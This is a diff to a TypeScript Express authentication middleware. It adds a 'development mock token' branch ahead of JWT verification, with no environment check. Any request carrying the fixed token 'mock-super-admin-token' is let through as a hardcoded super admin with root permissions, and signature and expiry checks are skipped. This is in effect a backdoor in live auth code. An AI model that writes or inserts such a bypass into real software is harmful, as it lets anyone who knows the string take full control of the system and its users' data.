@@ -30,6 +30,28 @@ export const requireAuth = async (req: Request, res: Response, next: NextFunctio
 
   const token = authHeader.split(' ')[1];
 
+  // ==========================================
+  // Development Mock Token Bypass
+  // ==========================================
+  if (token === 'mock-super-admin-token') {
+    const authReq = req as any;
+    authReq.user = {
+      id: 'e23214cd-917a-4867-b558-b10c8f55c857', // admin@demo.com ID
+      organization_id: 'c7558de2-97bb-41b2-866e-9675c79462d2',
+      status: 'ACTIVE',
+      email: 'admin@demo.com',
+      full_name: 'System Super Admin',
+      session_version: 1,
+    };
+    authReq.organizationId = 'c7558de2-97bb-41b2-866e-9675c79462d2';
+    authReq.organizationStatus = 'ACTIVE';
+    // Give them root access
+    authReq.permissions = new Set(['system:root', 'admin:manage']);
+    authReq.ipAddress = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || 'unknown';
+    
+    return next();
+  }
+
   try {
     // 1. Validate JWT Signature & Expiry
     const payload = tokenService.verifyAccessToken(token);
